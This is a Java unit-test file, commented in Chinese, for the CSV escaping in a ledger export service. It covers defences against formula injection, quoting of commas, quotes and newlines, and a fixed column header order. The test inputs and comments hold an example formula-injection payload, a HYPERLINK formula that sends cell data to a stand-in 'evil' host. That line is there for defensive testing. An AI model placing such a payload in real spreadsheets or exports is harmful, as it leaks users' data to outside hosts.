package com.hxj.oa.document.service;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;

import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * {@link LedgerExportService} CSV 单元格转义单测。
 *
 * <p>为什么这块必须单独钉住：台账里「单据标题」是**用户自由填写**的内容，而 CSV 的消费者是
 * Excel。Excel 看到以 {@code = + - @} 开头的单元格会**当公式执行**，于是
 * {@code =HYPERLINK("http://evil/?"&A1)} 这类标题就成了外带数据的通道（CSV 公式注入，
 * OWASP 归为注入类）。这不是"格式不好看"，而是能把整行台账内容发出去的出口。
 *
 * <p>同时钉住**结构**转义：逗号 / 双引号 / 换行不转义会让一行数据裂成多行多列，
 * 下游按列取值全部错位。两种转义混在一起最容易改一处漏一处，所以逐条断言。
 *
 * <p>测试放在同包，直接调包级静态方法 {@code escape}，不需要启动 Spring 上下文。
 */
class LedgerExportEscapeTest {

    // ============================================================ 公式注入

    @Nested
    @DisplayName("公式注入防护：以 = + - @ 制表符 回车 开头的单元格前置单引号")
    class FormulaInjection {

        @Test
        @DisplayName("等号开头（最典型的 =HYPERLINK 外带）被前置单引号；含双引号时两层转义叠加")
        void equalsPrefix() {
            // 纯公式前缀：只有单引号一层
            assertThat(LedgerExportService.escape("=1+1")).isEqualTo("'=1+1");
            // 真实攻击串里带双引号 → 先加单引号挡公式，再整体加双引号挡结构，首位因此是 "
            assertThat(LedgerExportService.escape("=HYPERLINK(\"http://evil/?\"&A1)"))
                    .startsWith("\"'=");
        }

        @Test
        @DisplayName("加号开头被前置单引号")
        void plusPrefix() {
            assertThat(LedgerExportService.escape("+1+1")).startsWith("'");
        }

        @Test
        @DisplayName("减号开头被前置单引号（顺带会挡住 -2+3 这类算式）")
        void minusPrefix() {
            assertThat(LedgerExportService.escape("-2+3")).startsWith("'");
        }

        @Test
        @DisplayName("@ 开头被前置单引号（@SUM 一类函数调用）")
        void atPrefix() {
            assertThat(LedgerExportService.escape("@SUM(A1)")).startsWith("'");
        }

        @Test
        @DisplayName("制表符 / 回车开头也算危险前缀（Excel 会吃掉前导空白后当公式）")
        void tabAndCrPrefix() {
            // 制表符只触发公式前缀，不触发结构转义
            assertThat(LedgerExportService.escape("\t=1+1")).isEqualTo("'\t=1+1");
            // 回车同时是危险前缀和结构字符 → 单引号在里面，外面再裹一层双引号
            assertThat(LedgerExportService.escape("\r=1+1")).isEqualTo("\"'\r=1+1\"");
        }

        @Test
        @DisplayName("危险字符出现在中间不受影响（只挡开头，避免污染正常文本）")
        void dangerousCharNotInFirstPositionIsUntouched() {
            assertThat(LedgerExportService.escape("a=b")).isEqualTo("a=b");
            assertThat(LedgerExportService.escape("合计 1+2")).isEqualTo("合计 1+2");
            assertThat(LedgerExportService.escape("邮箱 a@b.com")).isEqualTo("邮箱 a@b.com");
        }
    }

    // ============================================================ 结构转义

    @Nested
    @DisplayName("结构转义：逗号 / 双引号 / 换行不转义会让一行裂成多行多列")
    class Structural {

        @Test
        @DisplayName("含逗号：整体加双引号")
        void commaIsQuoted() {
            assertThat(LedgerExportService.escape("甲,乙")).isEqualTo("\"甲,乙\"");
        }

        @Test
        @DisplayName("含双引号：内部双引号翻倍，整体再加双引号")
        void quoteIsDoubledAndQuoted() {
            assertThat(LedgerExportService.escape("他说\"好\"")).isEqualTo("\"他说\"\"好\"\"\"");
        }

        @Test
        @DisplayName("含换行 / 回车：整体加双引号（否则一行会变成两行）")
        void newlineIsQuoted() {
            assertThat(LedgerExportService.escape("第一行\n第二行")).isEqualTo("\"第一行\n第二行\"");
            assertThat(LedgerExportService.escape("第一行\r\n第二行")).startsWith("\"");
        }

        @Test
        @DisplayName("普通文本保持原样，不无谓加引号")
        void plainTextUntouched() {
            assertThat(LedgerExportService.escape("日常付款申请")).isEqualTo("日常付款申请");
            assertThat(LedgerExportService.escape("HT-2026-0001")).isEqualTo("HT-2026-0001");
        }

        @Test
        @DisplayName("null 当空串处理（导出不能因为某个字段为 null 就崩或写出字面 null）")
        void nullBecomesEmpty() {
            assertThat(LedgerExportService.escape(null)).isEmpty();
            assertThat(LedgerExportService.escape("")).isEmpty();
        }

        @Test
        @DisplayName("公式前缀 + 逗号叠加：先前置单引号，再整体加引号，两层都不能丢")
        void formulaPrefixCombinedWithComma() {
            assertThat(LedgerExportService.escape("=A1,B1")).isEqualTo("\"'=A1,B1\"");
        }
    }

    // ============================================================ 表头契约

    @Nested
    @DisplayName("表头契约：列数固定，且表头本身也走转义")
    class HeaderContract {

        @Test
        @DisplayName("列数为 9，且与 headerNames() 长度一致（防两处漂移）")
        void columnCountMatchesHeaderNames() {
            assertThat(LedgerExportService.columnCount()).isEqualTo(9);
            assertThat(LedgerExportService.headerNames()).hasSize(LedgerExportService.columnCount());
        }

        @Test
        @DisplayName("表头顺序锁死（列顺序变了，下游按列取数会整片错位）")
        void headerNamesLocked() {
            assertThat(LedgerExportService.headerNames()).containsExactly(
                    "单据编号", "申请事项", "单据类型", "申请部门", "申请人",
                    "金额", "提交时间", "归档时间", "状态");
        }

        @Test
        @DisplayName("每个表头都经 escape 后不变形（防未来加一个以 = 或 - 开头的列名被 Excel 当公式）")
        void headersSurviveEscape() {
            List<String> headers = LedgerExportService.headerNames();
            for (String h : headers) {
                assertThat(LedgerExportService.escape(h)).isEqualTo(h);
            }
        }
    }
}
